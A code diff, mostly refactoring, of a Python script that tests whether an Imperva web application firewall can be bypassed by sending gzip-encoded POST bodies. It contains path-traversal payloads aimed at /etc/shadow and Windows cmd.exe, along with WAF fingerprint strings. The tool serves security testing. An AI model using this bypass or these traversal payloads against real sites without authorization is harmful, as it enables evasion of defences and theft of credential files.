@@ -50,6 +50,17 @@ You can script this tool and check the exit code in the caller:
 	131: The bypass was effective against both Windows and UNIX payloads.
 
 """
+import sys
+import requests
+
+# By default HTTP POST requests must elicit an HTTP 200 response.
+# Pass -r on the command line to enable relaxed mode, where
+# HTTP 2xx and 3xx are acceptable responses to a POST request.
+relaxedMode = False
+
+payloadBaseline = {'foo': 'bar'}
+payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
+payloadWindowsTrigger  = {'foo': 'bar', 'test': '..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe'}
 
 knownWAFs = { 
 		"A potentially unsafe operation has been detected in your request to this site.": "WordFence",
@@ -63,18 +74,6 @@ knownWAFs = {
 		"This website is using a security service to protect itself from online attacks.": "Cloudflare",
 		"ERROR: The request could not be satisfied": "Cloudflare"
 }
-
-import sys
-import requests
-
-# By default HTTP POST requests must elicit an HTTP 200 response.
-# Pass -r on the command line to enable relaxed mode, where
-# HTTP 2xx and 3xx are acceptable responses to a POST request.
-relaxedMode = False
-
-payloadBaseline = {'foo': 'bar'}
-payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
-payloadWindowsTrigger  = {'foo': 'bar', 'test': '..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe'}
 
 class ImpervaBypass:
 	def __init__(self, URL):
@@ -147,7 +146,7 @@ class ImpervaBypass:
 
 		return self.WAFType
 
-	# Returns array (successFail, httpResponseStatusCode)
+	# Returns tuple (successFail, httpResponseStatusCode)
 	# success = false if there was an HTTP error (4xx, 5xx, etc) 
 	# success = true if there was a 2xx, 3xx, etc
 	def baseline_request(self):
@@ -156,19 +155,19 @@ class ImpervaBypass:
 			r.raise_for_status()
 			if self.relaxedMode == False and r.status_code != 200:
 				return (False, r.status_code)
-			return (True, r.status_code)
+			return True, r.status_code
 		except requests.exceptions.HTTPError:
-			return (False, r.status_code)
+			return False, r.status_code
 
-	# Returns array (successFail, httpResponseStatusCode)
+	# Returns tuple (successFail, httpResponseStatusCode)
 	# success = true if it's vulnerable; false otherwise
 	def is_vulnerable(self, payload):
 		try:
 			r = self.make_request(payload, headers={'Content-Encoding': 'gzip'})
 			r.raise_for_status()
-			return (True, r.status_code)
+			return True, r.status_code
 		except requests.exceptions.HTTPError:
-			return (False, r.status_code)
+			return False, r.status_code
 
 
 # If -t is passed on the commandline then guess the remote WAF type and exit.
@@ -187,7 +186,7 @@ else:
 
 # Verify we can make POST requests. No POST, no worky.
 print("[+] Can we make POST requests to %s?" % imp.URL)
-(success, status) = imp.baseline_request()
+success, status = imp.baseline_request()
 if success == False:
 	print("[!] Can't POST. Expected HTTP 200 but received HTTP %d. Use -r to allow HTTP 2xx and 3xx." % status)
 	exit(5)
@@ -207,7 +206,7 @@ print('[+] Found Imperva WAF!')
 # Then with a Windows WAF trigger.
 print('[+] Attempting gzip bypass for UNIX trigger...')
 exitCode = 128
-(success, status) = imp.is_vulnerable(payloadUnixTrigger)
+success, status = imp.is_vulnerable(payloadUnixTrigger)
 if success == False:
 	print("[-] Not vulnerable. HTTP response code: %d" % status)
 else:
@@ -215,7 +214,7 @@ else:
 	exitCode = exitCode | 1
 
 print('[+] Attempting gzip bypass for Windows trigger...')
-(success, status) = imp.is_vulnerable(payloadWindowsTrigger)
+success, status = imp.is_vulnerable(payloadWindowsTrigger)
 if success == False:
 	print("[-] Not vulnerable. HTTP response code: %d" % status)
 else:
